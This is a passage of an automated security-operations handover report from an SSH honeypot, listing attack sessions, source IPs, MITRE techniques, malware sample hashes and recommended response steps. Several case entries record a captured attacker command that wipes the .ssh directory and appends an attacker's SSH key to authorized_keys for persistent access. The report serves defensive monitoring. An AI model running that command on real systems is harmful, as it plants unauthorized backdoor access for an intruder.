| `2026-04-24 14:17:10` | `cowrie.client.version` |
| `2026-04-24 14:17:10` | `cowrie.client.kex` |
| `2026-04-24 14:17:10` | `cowrie.login.success` |
| `2026-04-24 14:17:11` | `cowrie.session.params` |
| `2026-04-24 14:17:11` | `cowrie.command.input` |
| `2026-04-24 14:17:11` | `cowrie.command.failed` |
| `2026-04-24 14:17:11` | `cowrie.log.closed` |
| `2026-04-24 14:17:11` | `cowrie.session.params` |
| `2026-04-24 14:17:11` | `cowrie.command.input` |
| `2026-04-24 14:17:12` | `cowrie.session.file_download` |
| `2026-04-24 14:17:12` | `cowrie.log.closed` |
| `2026-04-24 14:17:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f1553bf4204

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:17 |
| **Last Seen** | 2026-04-24 14:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:17:14` | `cowrie.session.connect` |
| `2026-04-24 14:17:14` | `cowrie.client.version` |
| `2026-04-24 14:17:14` | `cowrie.client.kex` |
| `2026-04-24 14:17:15` | `cowrie.login.success` |
| `2026-04-24 14:17:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-223e025c7489

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:20 |
| **Last Seen** | 2026-04-24 14:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:20:35` | `cowrie.session.connect` |
| `2026-04-24 14:20:35` | `cowrie.client.version` |
| `2026-04-24 14:20:35` | `cowrie.client.kex` |
| `2026-04-24 14:20:35` | `cowrie.login.success` |
| `2026-04-24 14:20:36` | `cowrie.session.params` |
| `2026-04-24 14:20:36` | `cowrie.command.input` |
| `2026-04-24 14:20:36` | `cowrie.command.failed` |
| `2026-04-24 14:20:36` | `cowrie.log.closed` |
| `2026-04-24 14:20:36` | `cowrie.session.params` |
| `2026-04-24 14:20:36` | `cowrie.command.input` |
| `2026-04-24 14:20:37` | `cowrie.session.file_download` |
| `2026-04-24 14:20:37` | `cowrie.log.closed` |
| `2026-04-24 14:20:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9343bd95171

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:20 |
| **Last Seen** | 2026-04-24 14:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:20:39` | `cowrie.session.connect` |
| `2026-04-24 14:20:39` | `cowrie.client.version` |
| `2026-04-24 14:20:39` | `cowrie.client.kex` |
| `2026-04-24 14:20:40` | `cowrie.login.success` |
| `2026-04-24 14:20:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71680e53e065

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-04-24 14:33 |
| **Last Seen** | 2026-04-24 14:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:33:53` | `cowrie.session.connect` |
| `2026-04-24 14:33:53` | `cowrie.client.version` |
| `2026-04-24 14:33:53` | `cowrie.client.kex` |
| `2026-04-24 14:33:54` | `cowrie.login.success` |
| `2026-04-24 14:33:54` | `cowrie.session.params` |
| `2026-04-24 14:33:54` | `cowrie.command.input` |
| `2026-04-24 14:33:54` | `cowrie.command.failed` |
| `2026-04-24 14:33:54` | `cowrie.log.closed` |
| `2026-04-24 14:33:54` | `cowrie.session.params` |
| `2026-04-24 14:33:54` | `cowrie.command.input` |
| `2026-04-24 14:33:54` | `cowrie.session.file_download` |
| `2026-04-24 14:33:54` | `cowrie.log.closed` |
| `2026-04-24 14:33:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-659a55f62679

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-04-24 14:33 |
| **Last Seen** | 2026-04-24 14:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:33:57` | `cowrie.session.connect` |
| `2026-04-24 14:33:57` | `cowrie.client.version` |
| `2026-04-24 14:33:57` | `cowrie.client.kex` |
| `2026-04-24 14:33:57` | `cowrie.login.success` |
| `2026-04-24 14:33:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7ccde098ffd

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-04-24 14:36 |
| **Last Seen** | 2026-04-24 14:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:36:26` | `cowrie.session.connect` |
| `2026-04-24 14:36:26` | `cowrie.client.version` |
| `2026-04-24 14:36:26` | `cowrie.client.kex` |
| `2026-04-24 14:36:27` | `cowrie.login.success` |
| `2026-04-24 14:36:27` | `cowrie.session.params` |
| `2026-04-24 14:36:27` | `cowrie.command.input` |
| `2026-04-24 14:36:27` | `cowrie.command.failed` |
| `2026-04-24 14:36:27` | `cowrie.log.closed` |
| `2026-04-24 14:36:27` | `cowrie.session.params` |
| `2026-04-24 14:36:27` | `cowrie.command.input` |
| `2026-04-24 14:36:27` | `cowrie.session.file_download` |
| `2026-04-24 14:36:27` | `cowrie.log.closed` |
| `2026-04-24 14:36:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c68872d4fbc4

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-04-24 14:36 |
| **Last Seen** | 2026-04-24 14:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:36:31` | `cowrie.session.connect` |
| `2026-04-24 14:36:31` | `cowrie.client.version` |
| `2026-04-24 14:36:31` | `cowrie.client.kex` |
| `2026-04-24 14:36:31` | `cowrie.login.success` |
| `2026-04-24 14:36:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.146.202[.]174` | **27** | 2026-04-24 13:44 | 2026-04-24 14:20 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `209.38.69[.]153` | **19** | 2026-04-24 13:56 | 2026-04-24 14:12 | 0m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `165.154.6[.]177` | **12** | 2026-04-24 13:44 | 2026-04-24 13:54 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.158.40[.]65` | **5** | 2026-04-24 14:26 | 2026-04-24 14:37 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `103.149.27[.]208` | **3** | 2026-04-24 13:43 | 2026-04-24 13:45 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `114.34.187[.]209` | 1 | 2026-04-24 15:09 | 2026-04-24 15:09 | 30s | 0 | `T1592` | 🟢 LOW |
| `45.55.185[.]224` | 1 | 2026-04-24 15:03 | 2026-04-24 15:03 | 2s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `45.55.185[.]224` | US | DigitalOcean, LLC | **100** ⚠️ | 24 |
| `114.34.187[.]209` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 15 |
| `209.38.69[.]153` | US | DigitalOcean, LLC | **100** ⚠️ | 15 |
| `165.154.6[.]177` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 4 |
| `103.158.40[.]65` | IN | Net Hub | **100** ⚠️ | 50 |
| `103.149.27[.]208` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `103.146.202[.]174` | ID | PT Cloud Hosting Indonesia | **100** ⚠️ | 50 |
| `125.73.32[.]184` | CN | CHINANET Guangxi province network | 14 | 0 |
| `48.217.251[.]105` | US | Microsoft Limited | 2 | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 137 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 71 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 66 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 35 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 35 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 14 below threshold 25 | 2 |
| AbuseIPDB score 2 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 141 cases |
| Tool 34  | Credential Extractor        | ✅ 137 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 9 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (2.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 7 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 70 priority case(s) shown individually · 7 recon entry/entries in table (5 group(s) consolidating 66 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-24T15:12:16Z_
